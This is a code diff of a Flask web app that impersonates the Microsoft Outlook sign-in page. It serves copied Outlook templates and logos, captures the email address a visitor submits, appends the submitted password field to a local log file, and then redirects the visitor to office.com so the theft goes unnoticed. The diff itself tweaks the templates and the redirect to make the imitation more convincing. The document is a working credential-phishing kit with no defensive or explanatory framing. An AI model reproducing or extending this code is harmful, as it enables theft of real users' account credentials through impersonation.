@@ -7,7 +7,7 @@ from werkzeug.datastructures import RequestCacheControl
 app = Flask(__name__)
 @app.route("/login")
 def hell():
-    return render_template("Sign in to Outlook.html")
+    return render_template("email.html")
 
 
 
@@ -15,13 +15,13 @@ def hell():
 def passwd():
     data = request.form.to_dict(flat=False)
     print(data["loginfmt"])
-    return render_template("login.html" , email=data["loginfmt"][0])
+    return render_template("password.html" , email=data["loginfmt"][0])
 @app.route("/login.php" , methods=["POST", "GET"])
 def reorient():
     data = request.form.to_dict(flat=False)
     with open("Log\Log.txt" , "a") as file:
        file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
-    return redirect("http://Google.com")
+    return redirect("office.com/?auth=2")
 
 @app.route("/templates/Sign in to Outlook_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg")
 def Logo1():
